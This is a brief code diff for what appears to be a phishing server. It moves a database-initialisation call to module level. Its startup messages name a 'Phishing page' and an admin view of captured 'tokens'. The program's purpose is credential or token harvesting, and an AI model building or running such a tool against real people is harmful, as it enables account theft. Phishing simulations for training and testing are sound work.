@@ -134,8 +134,9 @@ def view_token(token_id):
         'created_at': row[6],
     })
 
+init_db()
+
 if __name__ == '__main__':
-    init_db()
     print(f'Server running on http://localhost:5000')
     print(f'Phishing page: http://localhost:5000/')
     print(f'View tokens:  http://localhost:5000/admin')
